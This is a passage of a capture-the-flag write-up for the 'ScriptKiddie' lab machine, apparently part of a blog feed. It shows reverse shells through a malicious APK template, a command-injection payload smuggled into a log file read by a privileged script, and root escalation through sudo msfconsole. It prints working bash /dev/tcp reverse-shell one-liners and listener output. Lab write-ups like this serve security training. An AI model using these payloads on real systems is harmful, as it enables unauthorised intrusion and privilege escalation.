-</code></pre></div><h4 id="reverse-shell---kid">Reverse shell - kid</h4>
-<p>I&rsquo;ll setup a <code>nc</code> listener on port 9000, then I&rsquo;ll upload the <code>evil.apk</code> file as the template file and then I&rsquo;ll click on the generate button.</p>
-<p><img class="img-container" src="imgs/image-20210614103158432.png" alt="image-20210614103158432"  />
-</p>
-<p>On my listener, I&rsquo;ve a shell now as user <code>kid</code>.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"> root@kali «exploits» «10.10.14.31» 
-$ nc -nvlp <span style="color:#ae81ff">9000</span>
-listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">9000</span> ...
-connect to <span style="color:#f92672">[</span>10.10.14.31<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.10.226<span style="color:#f92672">]</span> <span style="color:#ae81ff">34230</span>
-bash: cannot set terminal process group <span style="color:#f92672">(</span>897<span style="color:#f92672">)</span>: Inappropriate ioctl <span style="color:#66d9ef">for</span> device
-bash: no job control in this shell
-kid@scriptkiddie:~/html$    
-</code></pre></div><p><img class="img-container" src="imgs/image-20210614102941088.png" alt="image-20210614102941088"  />
-</p>
-<h4 id="shell-upgrade">Shell upgrade</h4>
-<p>I&rsquo;ll upgrade my shell first.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «exploits» «10.10.14.31» 
-$ nc -nvlp <span style="color:#ae81ff">9000</span>
-listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">9000</span> ...
-connect to <span style="color:#f92672">[</span>10.10.14.31<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.10.226<span style="color:#f92672">]</span> <span style="color:#ae81ff">34230</span>
-bash: cannot set terminal process group <span style="color:#f92672">(</span>897<span style="color:#f92672">)</span>: Inappropriate ioctl <span style="color:#66d9ef">for</span> device
-bash: no job control in this shell
-kid@scriptkiddie:~/html$ id
-uid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>kid<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>kid<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>kid<span style="color:#f92672">)</span>
-kid@scriptkiddie:~/html$ export TERM<span style="color:#f92672">=</span>xterm
-export TERM<span style="color:#f92672">=</span>xterm
-kid@scriptkiddie:~/html$ which python
-which python
-kid@scriptkiddie:~/html$ python3 -c <span style="color:#e6db74">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
-python3 -c <span style="color:#e6db74">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
-kid@scriptkiddie:~/html$ ^Z
-<span style="color:#f92672">[</span>1<span style="color:#f92672">]</span>  + <span style="color:#ae81ff">10652</span> suspended  nc -nvlp <span style="color:#ae81ff">9000</span>
-→ root@kali «exploits» «10.10.14.31» 
-$ stty raw -echo; fg
-<span style="color:#f92672">[</span>1<span style="color:#f92672">]</span>  + <span style="color:#ae81ff">10652</span> continued  nc -nvlp <span style="color:#ae81ff">9000</span>
-
-kid@scriptkiddie:~/html$ 
-</code></pre></div><p>User flag is done here.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">kid@scriptkiddie:~/html$ cd ~
-kid@scriptkiddie:~$ ls -la
-total <span style="color:#ae81ff">60</span>
-...&lt;SNIP&gt;...
--rw-r--r--  <span style="color:#ae81ff">1</span> kid  kid   <span style="color:#ae81ff">807</span> Feb <span style="color:#ae81ff">25</span>  <span style="color:#ae81ff">2020</span> .profile
-drwx------  <span style="color:#ae81ff">2</span> kid  kid  <span style="color:#ae81ff">4096</span> Feb <span style="color:#ae81ff">10</span> 16:11 .ssh
--rw-r--r--  <span style="color:#ae81ff">1</span> kid  kid     <span style="color:#ae81ff">0</span> Jan  <span style="color:#ae81ff">5</span> 11:10 .sudo_as_admin_successful
-drwxrwxr-x  <span style="color:#ae81ff">5</span> kid  kid  <span style="color:#ae81ff">4096</span> Feb  <span style="color:#ae81ff">3</span> 11:03 html
-drwxrwxrwx  <span style="color:#ae81ff">2</span> kid  kid  <span style="color:#ae81ff">4096</span> Feb  <span style="color:#ae81ff">3</span> 07:40 logs
-drwxr-xr-x  <span style="color:#ae81ff">3</span> kid  kid  <span style="color:#ae81ff">4096</span> Feb  <span style="color:#ae81ff">3</span> 11:48 snap
--r--------  <span style="color:#ae81ff">1</span> kid  kid    <span style="color:#ae81ff">33</span> Jun <span style="color:#ae81ff">12</span> 11:35 user.txt
-</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
-<h3 id="shell-as-pwn">Shell as pwn</h3>
-<h4 id="internal-enumeration">Internal Enumeration</h4>
-<p>On kid&rsquo;s home, there&rsquo;s a folder called <code>logs</code>. The <code>logs</code> folder contains one file called <code>hackers</code>, but the content is empty.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">kid@scriptkiddie:~/logs$ ls -la
-total <span style="color:#ae81ff">8</span>
-drwxrwxrwx  <span style="color:#ae81ff">2</span> kid kid <span style="color:#ae81ff">4096</span> Feb  <span style="color:#ae81ff">3</span> 07:40 .
-drwxr-xr-x <span style="color:#ae81ff">11</span> kid kid <span style="color:#ae81ff">4096</span> Feb  <span style="color:#ae81ff">3</span> 11:49 ..
--rw-rw-r--  <span style="color:#ae81ff">1</span> kid pwn    <span style="color:#ae81ff">0</span> Jun <span style="color:#ae81ff">14</span> 01:40 hackers
-</code></pre></div><p>I did a quick check on the available users who have shells.  It looks like I need to escalate to <code>pwn</code>.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">kid@scriptkiddie:~$ cat /etc/passwd | grep sh$
-root:x:0:0:root:/root:/bin/bash
-kid:x:1000:1000:kid:/home/kid:/bin/bash
-pwn:x:1001:1001::/home/pwn:/bin/bash
-</code></pre></div><p>Searching files owned by user <code>pwn</code> discovers one script called <code>scanlosers.sh</code>.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">kid@scriptkiddie:~$ find / -type f -user pwn 2&gt;/dev/null
-/home/pwn/.bash_logout
-/home/pwn/.selected_editor
-/home/pwn/.bashrc
-/home/pwn/.profile
-/home/pwn/scanlosers.sh
-</code></pre></div><p>The script is writable by me.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">kid@scriptkiddie:~$ ls -l /home/pwn/scanlosers.sh
--rwxrwxr-- <span style="color:#ae81ff">1</span> pwn pwn <span style="color:#ae81ff">250</span> Jan <span style="color:#ae81ff">28</span> 17:57 /home/pwn/scanlosers.sh
-</code></pre></div><h4 id="script-analysis">Script analysis</h4>
-<p>The script is most likely linked with kid&rsquo;s hack tools website and probably can be abused with stacked command, but I need to find how the log in <code>hackers</code> file is formatted.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">kid@scriptkiddie:~$ cat /home/pwn/scanlosers.sh
-<span style="color:#75715e">#!/bin/bash</span>
-
-<span style="color:#75715e"># &lt;== Define log</span>
-log<span style="color:#f92672">=</span>/home/kid/logs/hackers 
-
-cd /home/pwn/
-cat $log | cut -d<span style="color:#e6db74">&#39; &#39;</span> -f3- | sort -u | <span style="color:#66d9ef">while</span> read ip; <span style="color:#66d9ef">do</span>
-    sh -c <span style="color:#e6db74">&#34;nmap --top-ports 10 -oN recon/</span><span style="color:#e6db74">${</span>ip<span style="color:#e6db74">}</span><span style="color:#e6db74">.nmap </span><span style="color:#e6db74">${</span>ip<span style="color:#e6db74">}</span><span style="color:#e6db74"> 2&gt;&amp;1 &gt;/dev/null&#34;</span> &amp;
-<span style="color:#66d9ef">done</span>
-<span style="color:#75715e"># &lt;== The log is cleared immediately</span>
-<span style="color:#66d9ef">if</span> <span style="color:#f92672">[[</span> <span style="color:#66d9ef">$(</span>wc -l &lt; $log<span style="color:#66d9ef">)</span> -gt <span style="color:#ae81ff">0</span> <span style="color:#f92672">]]</span>; <span style="color:#66d9ef">then</span> echo -n &gt; $log; <span style="color:#66d9ef">fi</span>
-</code></pre></div><p>Looking back into the web source code, I find how the log is formatted in a function called <code>searchsploit</code>. Inserting malicious input on the kid&rsquo;s hack tools will trigger the else condition on this function, which logs date and IP.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">...&lt;</span>SNIP<span style="color:#f92672">&gt;...</span>
-<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">searchsploit</span>(text, srcip):
-    <span style="color:#66d9ef">if</span> regex_alphanum<span style="color:#f92672">.</span>match(text):
-        result <span style="color:#f92672">=</span> subprocess<span style="color:#f92672">.</span>check_output([<span style="color:#e6db74">&#39;searchsploit&#39;</span>, <span style="color:#e6db74">&#39;--color&#39;</span>, text])
-        <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#39;index.html&#39;</span>, searchsploit<span style="color:#f92672">=</span>result<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;UTF-8&#39;</span>, <span style="color:#e6db74">&#39;ignore&#39;</span>))
-    <span style="color:#66d9ef">else</span>:
-        <span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#39;/home/kid/logs/hackers&#39;</span>, <span style="color:#e6db74">&#39;a&#39;</span>) <span style="color:#66d9ef">as</span> f:
-            f<span style="color:#f92672">.</span>write(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;[</span><span style="color:#e6db74">{</span>datetime<span style="color:#f92672">.</span>datetime<span style="color:#f92672">.</span>now()<span style="color:#e6db74">}</span><span style="color:#e6db74">] </span><span style="color:#e6db74">{</span>srcip<span style="color:#e6db74">}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
-        <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#39;index.html&#39;</span>, sserror<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;stop hacking me - well hack you back&#34;</span>)
-<span style="color:#f92672">...&lt;</span>SNIP<span style="color:#f92672">&gt;...</span>
-</code></pre></div><p>I can trigger an event that logs my IP in the <code>hackers</code> file but then the logs is cleared so fast that I couldn&rsquo;t catch it with the <code>watch</code> command.</p>
-<p><img class="img-container" src="imgs/image-20210614114025066.png" alt="image-20210614114025066"  />
-</p>
-<p>But with this, I could guess that this script is intended as a &lsquo;counter attack&rsquo;. From here, I know that <code>scanlosers.sh</code> is <strong>executed automatically</strong> after a malicious attempt is performed on the site.</p>
-<p>I could generate the same log format in one line:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «exploits» «10.10.14.31»
-$ python3 -c <span style="color:#e6db74">&#34;from datetime import datetime; print(f&#39;[{datetime.now()}] 127.0.0.1&#39;)&#34;</span>
-<span style="color:#f92672">[</span>2021-06-14 00:43:54.924946<span style="color:#f92672">]</span> 127.0.0.1
-</code></pre></div><p>To exploit the script, I have to trick this line from <code>scanlosers.sh</code></p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">echo $log | cut -d<span style="color:#e6db74">&#39; &#39;</span> -f3- | sort -u
-</code></pre></div><p>What that line does is it extracts the IP address from the log.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «exploits» «10.10.14.31»
-$ log<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;[2021-06-14 00:28:09.560444] 127.0.0.1&#39;</span>
-→ root@kali «exploits» «10.10.14.31»
-$ echo $log | cut -d<span style="color:#e6db74">&#39; &#39;</span> -f3- | sort -u
-127.0.0.1
-</code></pre></div><p>From here, I&rsquo;ll just add a semi-colon and a space before putting my reverse shell.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">[2021-06-14 00:28:09.560444] 127.0.0.1; bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.30/9000 0&gt;&amp;1&#39;;
-</code></pre></div><p>It becomes a stacked command.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «exploits» «10.10.14.31»
-$ echo <span style="color:#e6db74">&#34;[2021-06-14 00:28:09.560444] 127.0.0.1; bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.30/9000 0&gt;&amp;1&#39;;&#34;</span> | cut -d<span style="color:#e6db74">&#39; &#39;</span> -f3- | sort -u
-127.0.0.1; bash -c <span style="color:#e6db74">&#39;bash -i &gt;&amp; /dev/tcp/10.10.14.30/9000 0&gt;&amp;1&#39;</span>;
-</code></pre></div><p>If I map that format to this line:</p>
-<pre><code>sh -c &quot;nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2&gt;&amp;1 &gt;/dev/null&quot;
-</code></pre><p>It turns into this:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">sh -c <span style="color:#e6db74">&#34;nmap --top-ports 10 -oN recon/127.0.0.1; bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.30/9000 0&gt;&amp;1&#39;;.nmap 127.0.0.1; bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.30/9000 0&gt;&amp;1&#39;; 2&gt;&amp;1 &gt;/dev/null&#34;</span>
-</code></pre></div><h4 id="exploitation">Exploitation</h4>
-<p>Since the logs is cleared automatically, I&rsquo;ll use while loop to keep inserting my malicious log to the <code>hackers</code> file and setup my listener on port 9001.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">kid@scriptkiddie:~/logs$ <span style="color:#66d9ef">while</span> sleep 0.1; <span style="color:#66d9ef">do</span> echo <span style="color:#e6db74">&#34;[2021-06-14 00:28:09.560444] 127.0.0.1; bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.31/9001 0&gt;&amp;1&#39;;&#34;</span> &gt; hackers; <span style="color:#66d9ef">done</span>
-</code></pre></div><p>On my listener:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@kali «scriptkiddie» «10.10.14.31» 
-$ nc -nvlp <span style="color:#ae81ff">9001</span>             
-listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">9001</span> ...
-connect to <span style="color:#f92672">[</span>10.10.14.31<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.10.226<span style="color:#f92672">]</span> <span style="color:#ae81ff">33110</span>
-bash: cannot set terminal process group <span style="color:#f92672">(</span>868<span style="color:#f92672">)</span>: Inappropriate ioctl <span style="color:#66d9ef">for</span> device
-bash: no job control in this shell
-pwn@scriptkiddie:~$ id
-id
-uid<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>pwn<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>pwn<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>pwn<span style="color:#f92672">)</span>
-</code></pre></div><p><img class="img-container" src="imgs/image-20210614115903137.png" alt="image-20210614115903137"  />
-</p>
-<h3 id="shell-as-root">Shell as root</h3>
-<h4 id="sudo---msfconsole">Sudo - msfconsole</h4>
-<p>User <code>pwn</code> has sudo privileges on <code>msfconsole</code>.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">pwn@scriptkiddie:~$ sudo -l
-sudo -l
-Matching Defaults entries <span style="color:#66d9ef">for</span> pwn on scriptkiddie:
-    env_reset, mail_badpass,
-    secure_path<span style="color:#f92672">=</span>/usr/local/sbin<span style="color:#ae81ff">\:</span>/usr/local/bin<span style="color:#ae81ff">\:</span>/usr/sbin<span style="color:#ae81ff">\:</span>/usr/bin<span style="color:#ae81ff">\:</span>/sbin<span style="color:#ae81ff">\:</span>/bin<span style="color:#ae81ff">\:</span>/snap/bin
-
-User pwn may run the following commands on scriptkiddie:
-    <span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> NOPASSWD: /opt/metasploit-framework-6.0.9/msfconsole
-</code></pre></div><p>To exploit this I could just send a reverse shell using  <code>-x</code> options and then I&rsquo;ll wait on my <code>nc</code> listener.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">pwn@scriptkiddie:~$ sudo msfconsole -q -x <span style="color:#e6db74">&#39;bash -c &#34;bash -i &gt;&amp; /dev/tcp/10.10.14.31/9005 0&gt;&amp;1&#34;&#39;</span>
-</code></pre></div><p>And I&rsquo;m rooted</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «scriptkiddie» «10.10.14.31» 
-$ rlwrap nc -nvlp <span style="color:#ae81ff">9005</span>
-listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">9005</span> ...
-connect to <span style="color:#f92672">[</span>10.10.14.31<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.10.226<span style="color:#f92672">]</span> <span style="color:#ae81ff">43512</span>
-bash: cannot set terminal process group <span style="color:#f92672">(</span>868<span style="color:#f92672">)</span>: Inappropriate ioctl <span style="color:#66d9ef">for</span> device
-bash: no job control in this shell
-root@scriptkiddie:/home/pwn# id
-id
-uid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span>
-root@scriptkiddie:/home/pwn# cut -c-15 /root/root.txt
-cut -c-15 /root/root.txt
-bf7edd4c58e4420
-</code></pre></div><p><img class="img-container" src="imgs/image-20210614121311990.png" alt="image-20210614121311990"  />
-</p>
-<h2 id="references">References</h2>
-<ul>
-<li><a href="https://github.com/justinsteven/advisories/blob/master/2020_metasploit_msfvenom_apk_template_cmdi.md">https://github.com/justinsteven/advisories/blob/master/2020_metasploit_msfvenom_apk_template_cmdi.md</a></li>
-<li><a href="https://www.rapid7.com/db/modules/exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection/">https://www.rapid7.com/db/modules/exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection/</a></li>
-<li><a href="https://discuss.getsol.us/d/4656-java-command-unknown-after-update/3">https://discuss.getsol.us/d/4656-java-command-unknown-after-update/3</a></li>
-<li><a href="http://www.citrucoop.es/jdk-11.0.6/bin/">http://www.citrucoop.es/jdk-11.0.6/bin/</a></li>
 </ul>
 ]]></content:encoded>
     </item>
